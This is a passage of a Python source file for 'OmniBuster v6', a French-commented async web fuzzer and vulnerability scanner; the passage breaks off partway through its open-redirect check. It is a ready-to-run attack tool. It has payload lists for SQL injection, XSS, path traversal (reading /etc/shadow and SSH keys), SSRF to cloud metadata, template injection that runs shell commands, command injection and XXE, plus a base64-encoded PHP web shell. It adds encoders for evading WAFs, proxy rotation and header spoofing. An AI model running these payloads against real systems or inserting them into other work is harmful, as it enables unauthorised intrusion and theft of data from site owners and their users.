#!/usr/bin/env python3
# OmniBuster v6 - By Emerick-19
# Fuzzer web async + scanner de vulnérabilités tout-en-un
#
# Dépendances : aiohttp tqdm colorama
#   pip install aiohttp tqdm colorama
#
# Optionnel : sqlmap, dalfox, commix, ffuf (pour intégration externe)

import argparse
import asyncio
import base64
import csv
import hashlib
import html
import json
import os
import random
import re
import signal
import shutil
import string
import subprocess
import sys
import tempfile
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from typing import List, Optional, Tuple, Set, Dict, Any
from urllib.parse import urljoin, urlparse, quote, unquote

import aiohttp
from tqdm.asyncio import tqdm

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
    C_GREEN, C_YELLOW, C_RED, C_CYAN = Fore.GREEN, Fore.YELLOW, Fore.RED, Fore.CYAN
    C_MAGENTA, C_BLUE, C_BOLD, C_END = Fore.MAGENTA, Fore.BLUE, Style.BRIGHT, Style.RESET_ALL
except ImportError:
    C_GREEN = C_YELLOW = C_RED = C_CYAN = C_MAGENTA = C_BLUE = C_BOLD = C_END = ""

# ===========================================================================
# SECTION 1 : ENCODEURS
# ===========================================================================

def random_case(s, ratio=0.5):
    return "".join(c.upper() if random.random() < ratio else c.lower() for c in s)

def insert_random_comments(s, token="/**/"):
    for kw in ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "ORDER", "BY", "SLEEP"]:
        s = s.replace(kw, token + kw + token)
    return s

def url_encode_deep(s):
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")

def url_encode_partial(s, ratio=0.5):
    out = []
    for c in s:
        if c.isalnum() and random.random() > ratio:
            out.append(c)
        else:
            out.append(f"%{ord(c):02X}")
    return "".join(out)

def unicode_encode(s):
    return "".join(f"%u{ord(c):04X}" for c in s)

def html_entity_encode(s):
    return "".join(f"&#{ord(c)};" for c in s)

def js_unicode_encode(s):
    return "".join(f"\\u{ord(c):04x}" for c in s)

def base64_encode(s):
    return base64.b64encode(s.encode()).decode()

def hex_encode(s):
    return "0x" + s.encode().hex()

# ===========================================================================
# SECTION 2 : PAYLOAD FACTORY
# ===========================================================================

class PayloadFactory:
    SQLI_BASE = [
        "'", "\"", "')", "\"))", "' OR '1", "' AND '1",
        "1' AND 1=1-- -", "1' AND 1=2-- -", "1 AND 1=1", "1 AND 1=2",
        "1' UNION SELECT NULL-- -", "1' UNION SELECT NULL,NULL-- -",
        "1 UNION SELECT NULL,NULL,NULL-- -", "-1 UNION SELECT 1,2,3-- -",
        "1' AND SLEEP(5)-- -", "1' AND (SELECT SLEEP(5))-- -",
        "1'; WAITFOR DELAY '0:0:5'-- -", "1' AND pg_sleep(5)-- -",
        "1' AND (SELECT 1 FROM PG_SLEEP(5))-- -",
        "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
        "admin'-- -", "admin'#", "' OR 'x'='x", "' OR 1=1 LIMIT 1-- -",
    ]
    XSS_BASE = [
        "<script>alert(1)</script>", "<ScRiPt>alert(1)</sCrIpT>",
        "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "<svg/onload=alert(1)>", "<svg onload=alert(1)>",
        "<img src=x onerror=alert(1)>", "<img/src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>", "<body onload=alert(1)>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "javascript:alert(1)//", "<script>alert`1`</script>",
        "<details open ontoggle=alert(1)>", "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>", "%3Cscript%3Ealert(1)%3C/script%3E",
    ]
    LFI_BASE = [
        "../../../../etc/passwd", "../../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "../../../../etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+",
        "expect://id", "/var/log/apache2/access.log",
        "/proc/self/environ", "/proc/self/cmdline",
        "C:\\Windows\\win.ini", "/etc/shadow", "/root/.ssh/id_rsa",
        "/var/www/html/config.php",
    ]
    SSRF_BASE = [
        "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
        "http://0177.0.0.1/", "http://2130706433/", "http://0x7f000001/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://100.100.100.200/latest/meta-data/",
        "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
    ]
    OPEN_REDIRECT_BASE = [
        "//evil.com", "///evil.com", "https://evil.com",
        "http://evil.com", "//google.com@evil.com",
        "////evil.com", "/\\evil.com", "%2F%2Fevil.com",
    ]
    SSTI_BASE = [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
        "{{7*'7'}}", "{{config}}", "{{self.__class__.__mro__}}",
        "${7*7}", "${{7*7}}", "@(7*7)", "~{7*7}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{{x}}{% endfor %}",
    ]
    SSTI_SIGNATURES = [r"\b49\b", r"<class '", r"<type '", r"__mro__", r"<Config"]
    CMDI_BASE = [
        ";id", "|id", "||id", "&id", "&&id", "`id`", "$(id)",
        ";cat /etc/passwd", "|cat /etc/passwd",
        "%0aid", "%0d%0aid", "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)",
        "; ping -c 2 127.0.0.1", "| whoami", "& whoami",
    ]
    CMDI_SIGNATURES = [r"uid=\d+", r"gid=\d+", r"root:.*:0:0:", r"nt authority", r"volume serial"]
    CRLF_BASE = [
        "%0d%0aInjected-Header: value",
        "%0d%0a%0d%0a<html>injected</html>",
        "\r\nInjected: value",
        "%23%0d%0aInjected: value",
        "%E5%98%8A%E5%98%8DInjected: value",
    ]
    XXE_BASE = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]><root/>',
    ]
    XXE_SIGNATURES = [r"root:.*:0:0:", r"\[boot loader\]"]
    SENSITIVE_PATHS = [
        ".git/config", ".git/HEAD", ".svn/entries", ".env", ".env.bak",
        ".env.local", ".env.production", "config.php.bak", "config.php~",
        "wp-config.php.bak", "backup.sql", "backup.zip", "backup.tar.gz",
        "database.sql", "dump.sql", "id_rsa", ".ssh/id_rsa",
        "web.config", "web.config.bak", "Dockerfile", "docker-compose.yml",
        ".htaccess", ".htpasswd", "phpinfo.php", "info.php", "test.php",
        "admin.php", "administrator.php", "console", "shell.php",
        "server-status", "server-info", ".DS_Store", "Thumbs.db",
        "package.json", "composer.json", ".npmrc", ".gitlab-ci.yml",
        "jenkins.xml", "crossdomain.xml", "clientaccesspolicy.xml",
        "sitemap.xml", "robots.txt", "security.txt", ".well-known/security.txt",
        "actuator", "actuator/env", "actuator/health", "actuator/beans",
        "swagger.json", "swagger-ui.html", "api-docs", "openapi.json",
    ]
    HTTP_VERBS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD",
                  "TRACE", "TRACK", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL"]
    COOKIE_SECURE_FLAGS = ["Secure", "HttpOnly", "SameSite"]

    @classmethod
    def _obfuscate_sqli(cls, base):
        out = []
        for p in base:
            out += [
                random_case(p), insert_random_comments(p),
                p.replace(" ", "/**/"), p.replace(" ", "\t"),
                url_encode_partial(p), url_encode_deep(p),
                p.replace("'", "%27"), p.replace(" ", "+"),
            ]
        return out

    @classmethod
    def _obfuscate_xss(cls, base):
        out = []
        for p in base:
            out += [
                random_case(p), p.replace(" ", "/**/"),
                p.replace("alert", "confirm"), p.replace("alert", "prompt"),
                url_encode_partial(p), html_entity_encode(p),
                js_unicode_encode(p),
            ]
        return out

    @classmethod
    def _obfuscate_lfi(cls, base):
        out = []
        for p in base:
            out += [
                p.replace("../", "....//"), p.replace("../", "..%2f"),
                p.replace("../", "%2e%2e%2f"), p.replace("../", "..%252f"),
                url_encode_partial(p), url_encode_deep(p),
                p + "%00", p + "?", p + "#",
            ]
        return out

    @classmethod
    def sqli(cls, count=20, obfuscate=True):
        payloads = list(cls.SQLI_BASE)
        if obfuscate:
            payloads += cls._obfuscate_sqli(random.sample(cls.SQLI_BASE, min(10, len(cls.SQLI_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def xss(cls, count=25, obfuscate=True):
        payloads = list(cls.XSS_BASE)
        if obfuscate:
            payloads += cls._obfuscate_xss(random.sample(cls.XSS_BASE, min(10, len(cls.XSS_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def lfi(cls, count=30, obfuscate=True):
        payloads = list(cls.LFI_BASE)
        if obfuscate:
            payloads += cls._obfuscate_lfi(random.sample(cls.LFI_BASE, min(10, len(cls.LFI_BASE))))
        random.shuffle(payloads)
        return payloads[:count]

    @classmethod
    def ssrf(cls): return list(cls.SSRF_BASE)
    @classmethod
    def open_redirect(cls): return list(cls.OPEN_REDIRECT_BASE)
    @classmethod
    def ssti(cls): return list(cls.SSTI_BASE)
    @classmethod
    def cmdi(cls): return list(cls.CMDI_BASE)
    @classmethod
    def crlf(cls): return list(cls.CRLF_BASE)
    @classmethod
    def xxe(cls): return list(cls.XXE_BASE)

# ===========================================================================
# SECTION 3 : SIGNATURES
# ===========================================================================

SQLI_ERROR_SIGNATURES = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result",
    r"MySqlClient\.", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result", r"ORA-[0-9]{5}", r"Oracle error",
    r"Microsoft OLE DB Provider for ODBC Drivers", r"Microsoft Access Driver",
    r"JET Database Engine", r"Access Database Engine", r"SQLite/JDBCDriver",
    r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
    r"ODBC SQL Server Driver", r"SQLServer JDBC Driver",
    r"You have an error in your SQL syntax",
    r"Unclosed quotation mark after the character string",
]
LFI_SIGNATURES = [r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]", r"daemon:.*:/usr/sbin"]
WAF_SIGNATURES = {
    "Cloudflare": ["cf-ray", "cloudflare", "__cfduid", "cf-cache-status"],
    "AWS WAF": ["awselb", "x-amzn-requestid", "x-amz-cf-id"],
    "ModSecurity": ["mod_security", "modsecurity", "NOYB"],
    "Sucuri": ["x-sucuri-id", "x-sucuri-cache", "sucuri/cloudproxy"],
    "Akamai": ["akamai", "x-akamai", "akamaighost"],
    "Imperva": ["incap_ses", "visid_incap", "x-iinfo"],
    "F5 BIG-IP": ["bigip", "x-wa-info"],
    "Barracuda": ["barra_counter_session", "barracuda"],
    "Fastly": ["fastly", "x-served-by", "x-cache"],
    "Wordfence": ["wordfence", "wfvt_"],
}
SECURITY_HEADERS = {
    "Strict-Transport-Security": "high",
    "Content-Security-Policy": "high",
    "X-Content-Type-Options": "medium",
    "X-Frame-Options": "medium",
    "X-XSS-Protection": "low",
    "Referrer-Policy": "low",
    "Permissions-Policy": "low",
    "Cross-Origin-Opener-Policy": "low",
    "Cross-Origin-Resource-Policy": "low",
    "Cross-Origin-Embedder-Policy": "low",
}

# ===========================================================================
# SECTION 4 : CONFIG
# ===========================================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
]
DEFAULT_MATCH_CODES = {200, 204, 301, 302, 307, 401, 403}

@dataclass
class ScanConfig:
    target: str
    concurrency: int = 50
    timeout: int = 5
    retries: int = 2
    match_codes: Set[int] = field(default_factory=lambda: set(DEFAULT_MATCH_CODES))
    exclude_codes: Set[int] = field(default_factory=set)
    filter_size: Optional[int] = None
    filter_words: Optional[int] = None
    filter_lines: Optional[int] = None
    filter_regex: Optional[str] = None
    extensions: List[str] = field(default_factory=list)
    proxy: Optional[str] = None
    proxy_file: Optional[str] = None
    follow_redirects: bool = False
    recursion_depth: int = 0
    output_file: Optional[str] = None
    output_format: str = "txt"
    html_report: Optional[str] = None
    extra_headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    rate_limit: float = 0.0
    obfuscation: str = "medium"
    random_delay: bool = False
    spoof_headers: bool = True
    method: str = "GET"
    data: Optional[str] = None
    fuzz_position: str = "URL"   # URL, BODY, HEADER, COOKIE
    custom_payload_file: Optional[str] = None
    use_sqlmap: bool = False
    resume_file: Optional[str] = None
    batch_size: int = 500

@dataclass
class ScanResult:
    url: str
    status: int
    size: int
    words: int
    lines: int
    redirect: Optional[str] = None
    duration: float = 0.0
    extra: dict = field(default_factory=dict)

# ===========================================================================
# SECTION 5 : PROXY ROTATION
# ===========================================================================

class ProxyPool:
    def __init__(self, proxy=None, proxy_file=None):
        self.proxies = []
        if proxy:
            self.proxies.append(proxy)
        if proxy_file and os.path.exists(proxy_file):
            with open(proxy_file) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        if not line.startswith("http"):
                            line = "http://" + line
                        self.proxies.append(line)
        self._index = 0

    def next(self):
        if not self.proxies:
            return None
        p = self.proxies[self._index % len(self.proxies)]
        self._index += 1
        return p

    def __bool__(self):
        return bool(self.proxies)

# ===========================================================================
# SECTION 6 : HTTP CLIENT
# ===========================================================================

class HTTPClient:
    def __init__(self, config: ScanConfig):
        self.config = config
        self.sem = asyncio.Semaphore(config.concurrency)
        self.session: Optional[aiohttp.ClientSession] = None
        self._last_request = 0.0
        self._ua_index = 0
        self.proxy_pool = ProxyPool(config.proxy, config.proxy_file)

    async def __aenter__(self):
        headers = {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
        }
        if self.config.spoof_headers:
            parsed = urlparse(self.config.target if self.config.target.startswith("http")
                              else f"http://{self.config.target}")
            origin = f"{parsed.scheme}://{parsed.netloc}"
            headers.update({
                "Referer": origin + "/",
                "Origin": origin,
                "X-Requested-With": "XMLHttpRequest",
            })
        headers.update(self.config.extra_headers)
        connector = aiohttp.TCPConnector(ssl=False, limit=self.config.concurrency * 2)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            cookies=self.config.cookies or None,
        )
        self._default_headers = headers
        return self

    async def __aexit__(self, *args):
        if self.session:
            await self.session.close()

    def _next_ua(self):
        ua = USER_AGENTS[self._ua_index % len(USER_AGENTS)]
        self._ua_index += 1
        return ua

    async def _rate_limit(self):
        delay = self.config.rate_limit
        if self.config.random_delay:
            delay = random.uniform(0.1, 1.5)
        if delay > 0:
            elapsed = time.monotonic() - self._last_request
            if elapsed < delay:
                await asyncio.sleep(delay - elapsed)
            self._last_request = time.monotonic()

    async def request(self, method, url, headers=None, data=None, params=None,
                      allow_redirects=None, read_body=False, cookies=None):
        async with self.sem:
            await self._rate_limit()
            start = time.monotonic()
            merged = dict(self._default_headers)
            merged["User-Agent"] = self._next_ua()
            if headers:
                merged.update(headers)

            for attempt in range(self.config.retries + 1):
                try:
                    if allow_redirects is None:
                        allow_redirects = self.config.follow_redirects
                    proxy = self.proxy_pool.next() if self.proxy_pool else None
                    async with self.session.request(
                        method, url, headers=merged, data=data, params=params,
                        allow_redirects=allow_redirects, proxy=proxy, cookies=cookies,
                    ) as resp:
                        body = await resp.read() if read_body else b""
                        text = body.decode("utf-8", errors="ignore")
                        duration = time.monotonic() - start
                        return ScanResult(
                            url=url,
                            status=resp.status,
                            size=len(body) if read_body else int(resp.headers.get("Content-Length", 0) or 0),
                            words=len(text.split()) if read_body else 0,
                            lines=text.count("\n") if read_body else 0,
                            redirect=resp.headers.get("Location"),
                            duration=duration,
                            extra={
                                "body": text,
                                "headers": dict(resp.headers),
                                "cookies": dict(resp.cookies),
                            } if read_body else {"headers": dict(resp.headers)},
                        )
                except (aiohttp.ClientError, asyncio.TimeoutError):
                    if attempt < self.config.retries:
                        await asyncio.sleep(0.3 * (attempt + 1))
                        continue
                    return None
                except Exception:
                    return None
        return None

# ===========================================================================
# SECTION 7 : DÉTECTION
# ===========================================================================

async def detect_wildcard(client, base_url):
    rand_path = "".join(random.choices(string.ascii_lowercase + string.digits, k=16))
    url = f"{base_url.rstrip('/')}/{rand_path}"
    res = await client.request("GET", url, read_body=True, allow_redirects=False)
    if res and res.status in DEFAULT_MATCH_CODES:
        return (res.status, res.size)
    return None

async def detect_waf(client, url):
    detected = []
    res = await client.request("GET", url, read_body=True, allow_redirects=True)
    if not res:
        return detected
    headers = res.extra.get("headers", {})
    body = res.extra.get("body", "").lower()
    header_str = " ".join(f"{k}:{v}".lower() for k, v in headers.items())
    for waf, sigs in WAF_SIGNATURES.items():
        if any(sig.lower() in header_str or sig.lower() in body for sig in sigs):
            detected.append(waf)
    test_url = url + ("&" if "?" in url else "?") + "waf_test=<script>alert(1)</script>"
    test_res = await client.request("GET", test_url, read_body=True, allow_redirects=False)
    if test_res and test_res.status in (403, 406, 419, 501, 503) and not detected:
        detected.append("Unknown WAF")
    return detected

# ===========================================================================
# SECTION 8 : FILTRAGE & REPORTING
# ===========================================================================

def should_report(res, config, wildcard):
    if not res: return False
    if res.status not in config.match_codes: return False
    if res.status in config.exclude_codes: return False
    if config.filter_size is not None and res.size == config.filter_size: return False
    if config.filter_words and res.words == config.filter_words: return False
    if config.filter_lines and res.lines == config.filter_lines: return False
    if config.filter_regex and re.search(config.filter_regex, res.extra.get("body", "")): return False
    if wildcard and res.status == wildcard[0] and res.size == wildcard[1]: return False
    return True

class Reporter:
    def __init__(self, config):
        self.config = config
        self.results = []
        self.findings = []
        self.start_time = time.monotonic()
        self._init_output()

    def _init_output(self):
        if self.config.output_file:
            try:
                with open(self.config.output_file, "w", encoding="utf-8"): pass
            except OSError as e:
                print(f"{C_RED}[-] Impossible d'ouvrir {self.config.output_file}: {e}{C_END}")
                self.config.output_file = None

    def report(self, res, prefix=""):
        self.results.append(res)
        color = C_GREEN if res.status == 200 else C_YELLOW
        redirect_info = f" -> {C_CYAN}{res.redirect}{C_END}" if res.redirect else ""
        print(f"{prefix}{color}[{res.status}]{C_END} {res.url} "
              f"({C_BLUE}{res.size}b{C_END}/{res.words}w/{res.lines}l) "
              f"[{res.duration:.2f}s]{redirect_info}")
        self._write_result(res)

    def report_finding(self, category, detail, severity="info", url=""):
        color = {"info": C_CYAN, "low": C_YELLOW, "medium": C_MAGENTA,
                 "high": C_RED, "critical": C_RED + C_BOLD}.get(severity, C_CYAN)
        finding = {"category": category, "detail": detail, "severity": severity,
                   "url": url, "time": time.time()}
        self.findings.append(finding)
        url_str = f" [{url}]" if url else ""
        print(f"{color}[{category.upper()}]{C_END} {detail}{url_str}")
        if self.config.output_file:
            try:
                with open(self.config.output_file, "a", encoding="utf-8") as f:
                    f.write(f"FINDING\t{category}\t{severity}\t{url}\t{detail}\n")
            except OSError:
                pass

    def _write_result(self, res):
        if not self.config.output_file: return
        try:
            with open(self.config.output_file, "a", encoding="utf-8") as f:
                if self.config.output_format == "json":
                    f.write(json.dumps(asdict(res), default=str) + "\n")
                elif self.config.output_format == "csv":
                    csv.writer(f).writerow([res.url, res.status, res.size, res.words, res.lines, res.redirect or ""])
                else:
                    f.write(f"{res.status}\t{res.url}\t{res.size}\t{res.words}\t{res.lines}\n")
        except OSError:
            pass

    def summary(self):
        elapsed = time.monotonic() - self.start_time
        print(f"\n{C_MAGENTA}{C_BOLD}=== Scan terminé ==={C_END}")
        print(f"Requêtes     : {len(self.results)}")
        print(f"Findings     : {len(self.findings)}")
        print(f"Durée        : {elapsed:.2f}s")
        if self.config.output_file:
            print(f"Sortie       : {self.config.output_file}")
        if self.config.html_report:
            self._write_html_report()
            print(f"Rapport HTML : {self.config.html_report}")

    def _write_html_report(self):
        sev_colors = {"critical": "#8b0000", "high": "#d9534f",
                      "medium": "#f0ad4e", "low": "#5bc0de", "info": "#5cb85c"}
        rows = ""
        for f in sorted(self.findings, key=lambda x: ["info", "low", "medium", "high", "critical"].index(x["severity"]), reverse=True):
            rows += f"""<tr style="background:{sev_colors.get(f['severity'], '#fff')};color:#fff">
                <td>{f['severity'].upper()}</td><td>{html.escape(f['category'])}</td>
                <td>{html.escape(f['url'])}</td><td>{html.escape(f['detail'])}</td></tr>"""
        html_content = f"""<!DOCTYPE html><html><head><meta charset="utf-8">
<title>OmniBuster Report</title>
<style>body{{font-family:Arial;margin:20px}}table{{border-collapse:collapse;width:100%}}
td,th{{border:1px solid #ccc;padding:6px}}th{{background:#333;color:#fff}}</style>
</head><body><h1>OmniBuster v6 — Rapport</h1>
<p><b>Target :</b> {html.escape(self.config.target)}</p>
<p><b>Requêtes :</b> {len(self.results)} | <b>Findings :</b> {len(self.findings)}</p>
<table><tr><th>Sévérité</th><th>Catégorie</th><th>URL</th><th>Détail</th></tr>
{rows}</table></body></html>"""
        try:
            with open(self.config.html_report, "w", encoding="utf-8") as f:
                f.write(html_content)
        except OSError as e:
            print(f"{C_RED}[-] Erreur HTML report: {e}{C_END}")

# ===========================================================================
# SECTION 9 : WORDLIST
# ===========================================================================

def load_wordlist(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"{C_RED}[-] Wordlist introuvable: {path}{C_END}")
        sys.exit(1)

# ===========================================================================
# SECTION 10 : SCAN DIRECTORY (avec multi-FUZZ)
# ===========================================================================

async def scan_directory(client, config, reporter, wordlist, base_url, wildcard, depth=0):
    tasks = []
    def build_urls(word):
        clean = word.lstrip("/")
        urls = [urljoin(base_url + "/", clean)]
        if config.extensions and "." not in clean.split("/")[-1]:
            for ext in config.extensions:
                urls.append(urljoin(base_url + "/", f"{clean}.{ext.lstrip('.')}"))
        return urls

    for word in wordlist:
        for url in build_urls(word):
            tasks.append((word, url))

    async def worker(word, url):
        res = await client.request("GET", url, read_body=True, allow_redirects=False)
        if res and should_report(res, config, wildcard):
            reporter.report(res)
            if depth < config.recursion_depth and res.status in (200, 301, 302, 307):
                if not url.endswith("/") and res.status in (301, 302):
                    new_base = url + "/"
                elif url.endswith("/"):
                    new_base = url
                else:
                    return
                if new_base.count("/") > base_url.count("/"):
                    await scan_directory(client, config, reporter, wordlist, new_base, wildcard, depth + 1)

    with tqdm(total=len(tasks), desc=f"Dir(d={depth})", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w, u) for w, u in tasks]):
            await coro
            pbar.update(1)

# ===========================================================================
# SECTION 11 : SUB / VHOST / HEADER
# ===========================================================================

async def scan_subdomains(client, config, reporter, wordlist):
    parsed = urlparse(config.target if config.target.startswith("http") else f"http://{config.target}")
    base_host = parsed.hostname
    scheme = parsed.scheme or "http"
    async def worker(sub):
        sub = sub.strip().lower()
        if not sub: return
        url = f"{scheme}://{sub}.{base_host}"
        res = await client.request("GET", url, read_body=False, allow_redirects=True)
        if res and res.status in DEFAULT_MATCH_CODES:
            reporter.report(res, prefix=f"{C_GREEN}[SUB]{C_END} ")
            body = (res.extra.get("body") or "")[:2000]
            if "There isn't a GitHub Pages site here" in body or \
               "Fastly error: unknown domain" in body or \
               "NoSuchBucket" in body:
                reporter.report_finding("Subdomain-Takeover", url, "high", url)
    with tqdm(total=len(wordlist), desc="Sub", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

async def scan_vhosts(client, config, reporter, wordlist, baseline_size):
    parsed = urlparse(config.target if config.target.startswith("http") else f"http://{config.target}")
    host = parsed.hostname
    async def worker(sub):
        sub = sub.strip().lower()
        if not sub: return
        res = await client.request("GET", config.target, headers={"Host": f"{sub}.{host}"},
                                   read_body=True, allow_redirects=False)
        if res and res.status not in (404,) and res.size != baseline_size:
            reporter.report(res, prefix=f"{C_GREEN}[VHOST]{C_END} ")
    with tqdm(total=len(wordlist), desc="VHost", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

HEADER_TEMPLATES = [
    "X-Forwarded-For: {payload}", "X-Forwarded-Host: {payload}",
    "X-Real-IP: {payload}", "X-Client-IP: {payload}",
    "X-Originating-IP: {payload}", "X-Remote-IP: {payload}",
    "X-Remote-Addr: {payload}", "Client-IP: {payload}",
    "Forwarded: for={payload}",
]

async def scan_headers(client, config, reporter, wordlist, baseline_size):
    async def worker(word):
        for template in HEADER_TEMPLATES:
            name, _, value = template.format(payload=word.strip()).partition(":")
            res = await client.request("GET", config.target, headers={name.strip(): value.strip()},
                                       read_body=True, allow_redirects=False)
            if res and res.size != baseline_size and res.status not in (404,):
                reporter.report(res, prefix=f"{C_GREEN}[HEADER {name.strip()}]{C_END} ")
    with tqdm(total=len(wordlist), desc="Headers", unit="req") as pbar:
        for coro in asyncio.as_completed([worker(w) for w in wordlist]):
            await coro; pbar.update(1)

# ===========================================================================
# SECTION 12 : VULN SCANNERS
# ===========================================================================

def get_payload_count(level):
    return {"low": 15, "medium": 40, "high": 80}.get(level, 40)

def build_url_with_param(base_url, param, value):
    return f"{base_url}?{param}={quote(value, safe='')}"

async def scan_sqli(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        normal = await client.request("GET", f"{base_url}?{param}=1", read_body=True, allow_redirects=False)
        if not normal: return
        t0 = time.monotonic()
        await client.request("GET", f"{base_url}?{param}=1", read_body=True, allow_redirects=False)
        normal_time = time.monotonic() - t0
        for payload in PayloadFactory.sqli(count=count, obfuscate=obfuscate):
            t0 = time.monotonic()
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            elapsed = time.monotonic() - t0
            if not res: continue
            body = res.extra.get("body", "")
            for sig in SQLI_ERROR_SIGNATURES:
                if re.search(sig, body, re.IGNORECASE):
                    reporter.report_finding("SQLi-error",
                        f"param={param} payload={payload!r} sig={sig}", "high", res.url)
                    break
            if any(k in payload.upper() for k in ["SLEEP", "WAITFOR", "PG_SLEEP", "DBMS_PIPE"]) \
               and elapsed > normal_time + 2.5:
                reporter.report_finding("SQLi-time",
                    f"param={param} payload={payload!r} -> {elapsed:.2f}s vs {normal_time:.2f}s",
                    "high", res.url)
    with tqdm(total=len(params), desc="SQLi", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_xss(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        for payload in PayloadFactory.xss(count=count, obfuscate=obfuscate):
            marker = "".join(random.choices(string.ascii_letters, k=8))
            inject = f"{marker}{payload}"
            res = await client.request("GET", build_url_with_param(base_url, param, inject),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            if payload in body and marker in body:
                reporter.report_finding("XSS-reflected",
                    f"param={param} payload={payload!r}", "medium", res.url)
                break
    with tqdm(total=len(params), desc="XSS", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_lfi(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    count = get_payload_count(config.obfuscation)
    obfuscate = config.obfuscation in ("medium", "high")
    async def test_param(param):
        for payload in PayloadFactory.lfi(count=count, obfuscate=obfuscate):
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "")
            for sig in LFI_SIGNATURES:
                if re.search(sig, body):
                    reporter.report_finding("LFI",
                        f"param={param} payload={payload!r} sig={sig}", "critical", res.url)
                    return
    with tqdm(total=len(params), desc="LFI", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_ssrf(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    indicators = ["root:", "ami-id", "instance-id", "connection refused", "redis", "mysql"]
    async def test_param(param):
        for payload in PayloadFactory.ssrf():
            res = await client.request("GET", build_url_with_param(base_url, param, payload),
                                       read_body=True, allow_redirects=False)
            if not res: continue
            body = res.extra.get("body", "").lower()
            for sig in indicators:
                if sig in body:
                    reporter.report_finding("SSRF",
                        f"param={param} payload={payload!r} indicator={sig}", "high", res.url)
                    return
    with tqdm(total=len(params), desc="SSRF", unit="param") as pbar:
        for coro in asyncio.as_completed([test_param(p) for p in params]):
            await coro; pbar.update(1)

async def scan_open_redirect(client, config, reporter, params):
    parsed = urlparse(config.target)
    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    async def test_param(param):
